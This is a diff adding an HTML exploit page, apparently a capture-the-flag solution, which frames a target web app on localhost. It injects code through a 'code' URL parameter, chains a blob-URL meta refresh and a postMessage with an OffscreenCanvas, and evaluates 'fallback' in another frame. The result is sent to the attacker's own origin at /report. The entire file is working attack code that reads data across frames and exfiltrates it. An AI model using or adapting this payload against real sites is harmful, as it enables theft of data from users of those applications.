@@ -1,0 +1,42 @@
+<iframe id="orig"></iframe>
+<iframe id="f"></iframe>
+<script>
+		const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
+		;(async () => {
+			const base = `${location.protocol}//${location.host}`
+			const target = new URLSearchParams(location.search).get('target') ?? 'http://localhost:8763'
+			orig.src = target
+			await sleep(500)
+			f.src =
+				target +
+				'/?code=' +
+				encodeURIComponent(`
+	(function(){
+		with(this) {
+			const blob = new Blob(['<h1>peko</h1><script src="${target}/worker.js"><\/script>'], {type: 'text/html'})
+			const url = URL.createObjectURL(blob)
+			postMessage({ type: 'error', content: 'hello' + '<meta http-equiv="refresh" content="0; url='+url+'">' })
+		}
+	})()
+	`)
+			await sleep(2000)
+			console.log('posting')
+			const canvas = document.createElement('canvas').transferControlToOffscreen()
+			f.contentWindow.postMessage(
+				{
+					type: 'init',
+					code: `
+	(function(){
+		with(this) {
+			location = ${JSON.stringify(base)} + '/report?result=' + encodeURIComponent(top[0].eval('fallback'))
+			throw new Error("stop")
+		}
+	})()
+	`,
+					canvas
+				},
+				'*',
+				[canvas]
+			)
+		})()
+</script>
